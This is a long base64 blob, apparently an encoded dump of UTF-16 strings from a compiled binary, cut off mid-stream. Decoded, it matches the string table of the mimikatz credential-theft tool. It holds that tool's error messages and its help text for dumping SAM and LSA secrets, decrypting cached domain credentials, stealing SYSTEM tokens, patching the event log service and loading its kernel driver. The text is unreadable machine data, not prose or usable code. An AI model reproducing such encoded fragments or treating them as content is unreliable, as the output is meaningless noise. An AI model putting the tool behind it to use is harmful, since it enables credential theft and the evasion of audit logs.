QByAHQARwBlAHQATgBhAG0AZQBTAHQAcgBpAG4AZwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQARwBlAHQATgBhAG0AZQBTAHQAcgBpAG4AZwAgACgAZgBvAHIAIABsAGUAbgApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAGUAcgB0AE8AcABlAG4AUwB0AG8AcgBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABwAHIAbwB2AGkAZABlAHIAAAAAAAAAAABwAHIAbwB2AGkAZABlAHIAdAB5AHAAZQAAAAAAAAAAAG0AYQBjAGgAaQBuAGUAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBvAGYAdAB3AGEAcgBlACAASwBlAHkAIABTAHQAbwByAGEAZwBlACAAUAByAG8AdgBpAGQAZQByAAAAYwBuAGcAcAByAG8AdgBpAGQAZQByAAAAAAAAAAAAAAAgACoAIABTAHQAbwByAGUAIAAgACAAIAAgACAAIAAgACAAOgAgACcAJQBzACcACgAgACoAIABQAHIAbwB2AGkAZABlAHIAIAAgACAAIAAgACAAOgAgACcAJQBzACcAIAAoACcAJQBzACcAKQAKACAAKgAgAFAAcgBvAHYAaQBkAGUAcgAgAHQAeQBwAGUAIAA6ACAAJwAlAHMAJwAgACgAJQB1ACkACgAgACoAIABDAE4ARwAgAFAAcgBvAHYAaQBkAGUAcgAgACAAOgAgACcAJQBzACcACgAAAAAAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABrAGUAeQBzACAAOgAKAAAAAAAKACUAMgB1AC4AIAAlAHMACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFUAcwBlAHIASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAEMAcgB5AHAAdABHAGUAdABQAHIAbwB2AFAAYQByAGEAbQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAACgBDAE4ARwAgAGsAZQB5AHMAIAA6AAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABPAHAAZQBuAEsAZQB5ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQARQBuAHUAbQBLAGUAeQBzACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AE8AcABlAG4AUwB0AG8AcgBhAGcAZQBQAHIAbwB2AGkAZABlAHIAIAAlADAAOAB4AAoAAAAAAAAAAABFAHgAcABvAHIAdAAgAFAAbwBsAGkAYwB5AAAAAAAAAEwAZQBuAGcAdABoAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABOAEMAcgB5AHAAdABHAGUAdABQAHIAbwBwAGUAcgB0AHkAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAHIAaQBuAHQASwBlAHkASQBuAGYAbwBzACAAOwAgAEMAcgB5AHAAdABHAGUAdABLAGUAeQBQAGEAcgBhAG0AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAWQBFAFMAAABOAE8AAAAAAAkARQB4AHAAbwByAHQAYQBiAGwAZQAgAGsAZQB5ACAAOgAgACUAcwAKAAkASwBlAHkAIABzAGkAegBlACAAIAAgACAAIAAgACAAOgAgACUAdQAKAAAAAABwAHYAawAAAEMAQQBQAEkAUABSAEkAVgBBAFQARQBCAEwATwBCAAAATwBLAAAAAABLAE8AAAAAAAkAUAByAGkAdgBhAHQAZQAgAGUAeABwAG8AcgB0ACAAOgAgACUAcwAgAC0AIAAAACcAJQBzACcACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQASwBlAHkAVABvAEYAaQBsAGUAIAA7ACAARQB4AHAAbwByAHQAIAAvACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQASwBlAHkAVABvAEYAaQBsAGUAIAA7ACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGcAZQBuAGUAcgBhAHQAZQBGAGkAbABlAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAZABlAHIAAAAJAFAAdQBiAGwAaQBjACAAZQB4AHAAbwByAHQAIAAgADoAIAAlAHMAIAAtACAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAHAAZgB4AAAAbQBpAG0AaQBrAGEAdAB6AAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABFAHgAcABvAHIAdAAgAC8AIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACUAcwBfACUAcwBfACUAdQBfACUAcwAuACUAcwAAAAAAQQBUAF8ASwBFAFkARQBYAEMASABBAE4ARwBFAAAAAABBAFQAXwBTAEkARwBOAEEAVABVAFIARQAAAAAAAAAAAEMATgBHACAASwBlAHkAAAByAHMAYQBlAG4AaAAuAGQAbABsAAAAAABMAG8AYwBhAGwAIABDAHIAeQBwAHQAbwBBAFAASQAgAHAAYQB0AGMAaABlAGQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAF8AYwBhAHAAaQAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcABfAGMAYQBwAGkAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAbgBjAHIAeQBwAHQALgBkAGwAbAAAAAAAbgBjAHIAeQBwAHQAcAByAG8AdgAuAGQAbABsAAAAAABLAGUAeQBJAHMAbwAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAG4AZwAgADsAIABOAG8AIABDAE4ARwAKAAAAQwBsAGUAYQByACAAYQBuACAAZQB2AGUAbgB0ACAAbABvAGcAAAAAAGMAbABlAGEAcgAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABFAHYAZQBuAHQAcwAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAHYAbwBpAGQAIABuAGUAdwAgAGUAdgBlAG4AdABzAAAAZAByAG8AcAAAAAAAAAAAAEUAdgBlAG4AdAAgAG0AbwBkAHUAbABlAAAAAAAAAAAAZQB2AGUAbgB0AAAAAAAAAGwAbwBnAAAAZQB2AGUAbgB0AGwAbwBnAC4AZABsAGwAAAAAAAAAAAB3AGUAdgB0AHMAdgBjAC4AZABsAGwAAABFAHYAZQBuAHQATABvAGcAAAAAAAAAAABTAGUAYwB1AHIAaQB0AHkAAAAAAAAAAABVAHMAaQBuAGcAIAAiACUAcwAiACAAZQB2AGUAbgB0ACAAbABvAGcAIAA6AAoAAAAtACAAJQB1ACAAZQB2AGUAbgB0ACgAcwApAAoAAAAAAC0AIABDAGwAZQBhAHIAZQBkACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAAQwBsAGUAYQByAEUAdgBlAG4AdABMAG8AZwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZQB2AGUAbgB0AF8AYwBsAGUAYQByACAAOwAgAE8AcABlAG4ARQB2AGUAbgB0AEwAbwBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAATABpAHMAdAAgAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAAAAAAAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABGAFMAIABmAGkAbAB0AGUAcgBzAAAAZgBpAGwAdABlAHIAcwAAAFIAZQBtAG8AdgBlACAAbwBiAGoAZQBjAHQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawAAAAAAAABuAG8AdABpAGYATwBiAGoAZQBjAHQAUgBlAG0AbwB2AGUAAAAAAAAAUgBlAG0AbwB2AGUAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAAAAAAG4AbwB0AGkAZgBQAHIAbwBjAGUAcwBzAFIAZQBtAG8AdgBlAAAAAABMAGkAcwB0ACAAbwBiAGoAZQBjAHQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAAAAbgBvAHQAaQBmAE8AYgBqAGUAYwB0AAAATABpAHMAdAAgAHIAZQBnAGkAcwB0AHIAeQAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAG4AbwB0AGkAZgBSAGUAZwAAAAAAAAAAAEwAaQBzAHQAIABpAG0AYQBnAGUAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAbgBvAHQAaQBmAEkAbQBhAGcAZQAAAAAATABpAHMAdAAgAHQAaAByAGUAYQBkACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAAAAAAG4AbwB0AGkAZgBUAGgAcgBlAGEAZAAAAEwAaQBzAHQAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAAABuAG8AdABpAGYAUAByAG8AYwBlAHMAcwAAAAAAAAAAAEwAaQBzAHQAIABTAFMARABUAAAAAAAAAHMAcwBkAHQAAAAAAAAAAABMAGkAcwB0ACAAbQBvAGQAdQBsAGUAcwAAAAAAAAAAAG0AbwBkAHUAbABlAHMAAABTAGUAdAAgAGEAbABsACAAcAByAGkAdgBpAGwAZQBnAGUAIABvAG4AIABwAHIAbwBjAGUAcwBzAAAAAAAAAAAAcAByAG8AYwBlAHMAcwBQAHIAaQB2AGkAbABlAGcAZQAAAAAAAAAAAEQAdQBwAGwAaQBjAGEAdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwBrAGUAbgAAAHAAcgBvAGMAZQBzAHMAVABvAGsAZQBuAAAAAAAAAAAAUAByAG8AdABlAGMAdAAgAHAAcgBvAGMAZQBzAHMAAABwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAAAAAAEIAUwBPAEQAIAAhAAAAAABiAHMAbwBkAAAAAAAAAAAAUABpAG4AZwAgAHQAaABlACAAZAByAGkAdgBlAHIAAABwAGkAbgBnAAAAAAAAAAAAUgBlAG0AbwB2AGUAIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgACgAbQBpAG0AaQBkAHIAdgApAAAAAAAtAAAAAAAAAAAAAABJAG4AcwB0AGEAbABsACAAYQBuAGQALwBvAHIAIABzAHQAYQByAHQAIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgACgAbQBpAG0AaQBkAHIAdgApAAAAAAArAAAAAAAAAHIAZQBtAG8AdgBlAAAAAABMAGkAcwB0ACAAcAByAG8AYwBlAHMAcwAAAAAAAAAAAHAAcgBvAGMAZQBzAHMAAABtAGkAbQBpAGQAcgB2AC4AcwB5AHMAAABtAGkAbQBpAGQAcgB2AAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAGEAbAByAGUAYQBkAHkAIAByAGUAZwBpAHMAdABlAHIAZQBkAAoAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAbgBvAHQAIABwAHIAZQBzAGUAbgB0AAoAAAAAAAAAAABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgACgAbQBpAG0AaQBkAHIAdgApAAAAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQACgAAAAAAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABBAEMATAAgAHQAbwAgAGUAdgBlAHIAeQBvAG4AZQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAVwBvAHIAbABkAFQAbwBNAGkAbQBpAGsAYQB0AHoAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAQwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwBpAHMARgBpAGwAZQBFAHgAaQBzAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwBnAGUAdABBAGIAcwBvAGwAdQB0AGUAUABhAHQAaABPAGYAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAATwBwAGUAbgBTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAcwB0AGEAcgB0AGUAZAAKAAAAAAAAAAAAWwAqAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAGEAbAByAGUAYQBkAHkAIABzAHQAYQByAHQAZQBkAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAFMAdABhAHIAdABTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAATwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgAoAGMAcgBlAGEAdABlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAcwB0AG8AcABwAGUAZAAKAAAAAAAAAAAAAAAAAAAAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwByAGUAbQBvAHYAZQBfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AcwB0AG8AcAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAcgBlAG0AbwB2AGUAZAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcgBlAG0AbwB2AGUAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAHIAZQBtAG8AdgBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABQAHIAbwBjAGUAcwBzACAAOgAgACUAcwAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAUAByAG8AYwBlAHMAcwBJAGQARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAHAAaQBkAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAgADsAIABBAHIAZwB1AG0AZQBuAHQAIAAvAHAAcgBvAGMAZQBzAHMAOgBwAHIAbwBnAHIAYQBtAC4AZQB4AGUAIABvAHIAIAAvAHAAaQBkADoAcAByAG8AYwBlAHMAcwBpAGQAIABuAGUAZQBkAGUAZAAKAAAAAAAAAAAAUABJAEQAIAAlAHUAIAAtAD4AIAAlADAAMgB4AC8AJQAwADIAeAAgAFsAJQAxAHgALQAlADEAeAAtACUAMQB4AF0ACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAE4AbwAgAFAASQBEAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAFAAcgBvAHQAZQBjAHQAZQBkACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABiAGUAZgBvAHIAZQAgAFcAaQBuAGQAbwB3AHMAIABWAGkAcwB0AGEACgAAAAAAZgByAG8AbQAAAAAAdABvAAAAAAAAAAAAVABvAGsAZQBuACAAZgByAG8AbQAgAHAAcgBvAGMAZQBzAHMAIAAlAHUAIAB0AG8AIABwAHIAbwBjAGUAcwBzACAAJQB1AAoAAAAAAAAAAAAgACoAIABmAHIAbwBtACAAMAAgAHcAaQBsAGwAIAB0AGEAawBlACAAUwBZAFMAVABFAE0AIAB0AG8AawBlAG4ACgAAAAAAAAAAAAAAAAAAACAAKgAgAHQAbwAgADAAIAB3AGkAbABsACAAdABhAGsAZQAgAGEAbABsACAAJwBjAG0AZAAnACAAYQBuAGQAIAAnAG0AaQBtAGkAawBhAHQAegAnACAAcAByAG8AYwBlAHMAcwAKAAAAVABhAHIAZwBlAHQAIAA9ACAAMAB4ACUAcAAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBuAG8AdABpAGYAeQBHAGUAbgBlAHIAaQBjAFIAZQBtAG8AdgBlACAAOwAgAE4AbwAgAGEAZABkAHIAZQBzAHMAPwAKAAAAAABLAGUAcgBiAGUAcgBvAHMALQBOAGUAdwBlAHIALQBLAGUAeQBzAAAASwBlAHIAYgBlAHIAbwBzAAAAAAAAAAAAVwBEAGkAZwBlAHMAdAAAAEMATABFAEEAUgBUAEUAWABUAAAAAAAAAFAAcgBpAG0AYQByAHkAAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAAAAAAAG4AdABkAGwAbAAuAGQAbABsAAAAAAAAAGwAcwBhAHMAcgB2AC4AZABsAGwAAAAAAHMAYQBtAHMAcgB2AC4AZABsAGwAAAAAAEQAYQB0AGEAAAAAAAAAAABHAEIARwAAAFMAawBlAHcAMQAAAEoARAAAAAAAAAAAAEQAZQBmAGEAdQBsAHQAAABDAHUAcgByAGUAbgB0AAAAQQBzAGsAIABMAFMAQQAgAFMAZQByAHYAZQByACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAUwBBAE0ALwBBAEQAIABlAG4AdAByAGkAZQBzACAAKABuAG8AcgBtAGEAbAAsACAAcABhAHQAYwBoACAAbwBuACAAdABoAGUAIABmAGwAeQAgAG8AcgAgAGkAbgBqAGUAYwB0ACkAAAAAAGwAcwBhAAAAAAAAAAAAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAATgBMACQASwBNACAAdABoAGUAbgAgAE0AUwBDAGEAYwBoAGUAKAB2ADIAKQAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAAAAAAGMAYQBjAGgAZQAAAAAAAAAAAAAAAAAAAEcAZQB0ACAAdABoAGUAIABTAHkAcwBLAGUAeQAgAHQAbwAgAGQAZQBjAHIAeQBwAHQAIABTAEUAQwBSAEUAVABTACAAZQBuAHQAcgBpAGUAcwAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAAABzAGUAYwByAGUAdABzAAAAAAAAAAAAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAAUwBBAE0AIABlAG4AdAByAGkAZQBzACAAKABmAHIAbwBtACAAcgBlAGcAaQBzAHQAcgB5ACAAbwByACAAaABpAHYAZQBzACkAAAAAAHMAYQBtAAAATABzAGEARAB1AG0AcAAgAG0AbwBkAHUAbABlAAAAAABsAHMAYQBkAHUAbQBwAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAFkAUwBUAEUATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAQQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFMAWQBTAFQARQBNAAAAAABTAEEATQAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIAAoAFMAQQBNACkAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEUAQwBVAFIASQBUAFkAIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBZAFMAVABFAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFMARQBDAFUAUgBJAFQAWQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEUAQwBVAFIASQBUAFkAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAQwBvAG4AdAByAG8AbABTAGUAdAAwADAAMAAAAAAAAABTAGUAbABlAGMAdAAAAAAAJQAwADMAdQAAAAAAJQB4AAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAHkAcwBrAGUAeQAgADsAIABMAFMAQQAgAEsAZQB5ACAAQwBsAGEAcwBzACAAcgBlAGEAZAAgAGUAcgByAG8AcgAKAAAAAABEAG8AbQBhAGkAbgAgADoAIAAAAAAAAABDAG8AbgB0AHIAbwBsAFwAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAAAAAAAABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAAAAAAAAAAACUAcwAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAEsATwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAEsATwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAAAAAABTAHkAcwBLAGUAeQAgADoAIAAAAAAAAABDAG8AbgB0AHIAbwBsAFwATABTAEEAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAHkAcwBrAGUAeQAgAEsATwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHM